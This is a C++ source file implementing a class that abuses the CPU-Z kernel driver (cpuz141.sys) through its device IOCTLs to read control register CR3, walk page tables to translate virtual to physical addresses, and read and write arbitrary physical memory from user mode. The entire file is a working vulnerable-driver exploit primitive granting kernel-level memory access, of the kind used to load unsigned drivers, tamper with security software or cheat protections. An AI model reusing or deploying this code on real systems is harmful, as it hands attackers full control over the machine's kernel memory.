#include "Global.h"

#define IOCTL_CR 0x9C402428
#define IOCTL_READ 0x9C402420
#define IOCTL_WRITE 0x9C402430
#define CPUZ_NAME "\\\\.\\cpuz141"

#define LODWORD(l)       ((DWORD)(((DWORD_PTR)(l)) & 0xffffffff))
#define HIDWORD(l)       ((DWORD)((((DWORD_PTR)(l)) >> 32) & 0xffffffff))

typedef struct _InputRead
{
	uint32_t dwAddressHigh;
	uint32_t dwAddressLow;
	uint32_t dwLength;
	uint32_t dwBufferHigh;
	uint32_t dwBufferLow;
}InputRead, *PInputRead;

typedef struct _InputWrite
{
	uint32_t dwAddressHigh;
	uint32_t dwAddressLow;
	uint32_t dwVal;
}InputWrite, *PInputWrite;

typedef struct _Output
{
	uint32_t Operation;
	uint32_t dwBufferLow;
}Output, *POutput;

cpuz::cpuz()
{	
	hDevice = CreateFile(CPUZ_NAME, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
		throw std::runtime_error("Could Not Open cpu141.sys .");

	if (!ReadCR3())
		throw std::runtime_error("Could Not Read Control Register 3.");

}

cpuz::~cpuz()
{
	CloseHandle(hDevice);
}

/* CR3 Is The Table Base Of The Process Memory Page */
BOOLEAN cpuz::ReadCR3()
{
	DWORD BytesRet = 0;
	uint32_t CR = 3;		// Read ControlRegister3

	return DeviceIoControl(hDevice, IOCTL_CR, &CR, sizeof(CR), &ControlReg3, sizeof(ControlReg3), &BytesRet, nullptr);
}

/* Translating Virtual Address To Physical Address, Using a Table Base */
uint64_t cpuz::TranslateVirtualAddress(uint64_t directoryTableBase, LPVOID virtualAddress)
{
	auto va = (uint64_t)virtualAddress;

	auto PML4 = (USHORT)((va >> 39) & 0x1FF); //<! PML4 Entry Index
	auto DirectoryPtr = (USHORT)((va >> 30) & 0x1FF); //<! Page-Directory-Pointer Table Index
	auto Directory = (USHORT)((va >> 21) & 0x1FF); //<! Page Directory Table Index
	auto Table = (USHORT)((va >> 12) & 0x1FF); //<! Page Table Index

											   // 
											   // Read the PML4 Entry. DirectoryTableBase has the base address of the table.
											   // It can be read from the CR3 register or from the kernel process object.
											   // 
	auto PML4E = ReadPhysicalAddress<uint64_t>(directoryTableBase + PML4 * sizeof(ULONGLONG));

	if (PML4E == 0)
		return 0;

	// 
	// The PML4E that we read is the base address of the next table on the chain,
	// the Page-Directory-Pointer Table.
	// 
	auto PDPTE = ReadPhysicalAddress<uint64_t>((PML4E & 0xFFFFFFFFFF000) + DirectoryPtr * sizeof(ULONGLONG));

	if (PDPTE == 0)
		return 0;

	//Check the PS bit
	if ((PDPTE & (1 << 7)) != 0) {
		// If the PDPTE’s PS flag is 1, the PDPTE maps a 1-GByte page. The
		// final physical address is computed as follows:
		// — Bits 51:30 are from the PDPTE.
		// — Bits 29:0 are from the original va address.
		return (PDPTE & 0xFFFFFC0000000) + (va & 0x3FFFFFFF);
	}

	//
	// PS bit was 0. That means that the PDPTE references the next table
	// on the chain, the Page Directory Table. Read it.
	// 
	auto PDE = ReadPhysicalAddress<uint64_t>((PDPTE & 0xFFFFFFFFFF000) + Directory * sizeof(ULONGLONG));

	if (PDE == 0)
		return 0;

	if ((PDE & (1 << 7)) != 0) {
		// If the PDE’s PS flag is 1, the PDE maps a 2-MByte page. The
		// final physical address is computed as follows:
		// — Bits 51:21 are from the PDE.
		// — Bits 20:0 are from the original va address.
		return (PDE & 0xFFFFFFFE00000) + (va & 0x1FFFFF);
	}

	//
	// PS bit was 0. That means that the PDE references a Page Table.
	// 
	auto PTE = ReadPhysicalAddress<uint64_t>((PDE & 0xFFFFFFFFFF000) + Table * sizeof(ULONGLONG));

	if (PTE == 0)
		return 0;

	//
	// The PTE maps a 4-KByte page. The
	// final physical address is computed as follows:
	// — Bits 51:12 are from the PTE.
	// — Bits 11:0 are from the original va address.
	return (PTE & 0xFFFFFFFFFF000) + (va & 0xFFF);
}

/* Read Physical Address Using CPU-Z */
BOOLEAN cpuz::ReadPhysicalAddress(uint64_t Address, PVOID buffer, SIZE_T Length)
{
	DWORD BytesRet = 0;
	InputRead in{ 0 };
	Output out{ 0 };

	if (Address == 0 || buffer == nullptr)
		return false;

	in.dwAddressHigh = HIDWORD(Address);
	in.dwAddressLow = LODWORD(Address);
	in.dwLength = (uint32_t)Length;
	in.dwBufferHigh = HIDWORD(buffer);
	in.dwBufferLow = LODWORD(buffer);

	return DeviceIoControl(hDevice, IOCTL_READ, &in, sizeof(in), &out, sizeof(out), &BytesRet, nullptr);
}

/* Translate Virtual Address To Physical Using CR3, then Read It */
BOOLEAN cpuz::ReadSystemAddress(PVOID Address, PVOID buf, SIZE_T len)
{
	uint64_t phys = TranslateVirtualAddress(ControlReg3, Address);
	return ReadPhysicalAddress(phys, buf, len);
}

/* Write Physical Address Using CPU-Z */
BOOLEAN cpuz::WritePhysicalAddress(uint64_t Address, PVOID buffer, SIZE_T Length)
{
	if (Length % 4 != 0 || Length == 0)			// Can Only Write Lengths That Are A Multiple Of 4
		throw std::runtime_error{ "The CPU-Z driver can only write lengths that are aligned to 4 bytes (4, 8, 12, 16, etc)" };

	DWORD BytesRet = 0;
	InputWrite in{ 0 };
	Output out{ 0 };

	if (Address == 0 || buffer == nullptr)
		return false;

	if (Length == 4) 
	{
		in.dwAddressHigh = HIDWORD(Address);
		in.dwAddressLow = LODWORD(Address);
		in.dwVal = *(uint32_t*)buffer;

		return DeviceIoControl(hDevice, IOCTL_WRITE, &in, sizeof(in), &out, sizeof(out), &BytesRet, nullptr);
	}
	else 
	{
		for (auto i = 0; i < Length / 4; i++) 
		{			// Write Each Multiple
			in.dwAddressHigh = HIDWORD(Address + 4 * i);
			in.dwAddressLow = LODWORD(Address + 4 * i);
			in.dwVal = ((std::uint32_t*)buffer)[i];
			if (!DeviceIoControl(hDevice, IOCTL_WRITE, &in, sizeof(in), &out, sizeof(out), &BytesRet, nullptr))
				return false;
		}
		return true;
	}
}

/* Translate Virtual Address To Physical Using CR3, then Write It */
BOOLEAN cpuz::WriteSystemAddress(PVOID Address, PVOID buffer, SIZE_T Length)
{
	uint64_t phys = TranslateVirtualAddress(ControlReg3, Address);
	return WritePhysicalAddress(phys, buffer, Length);
}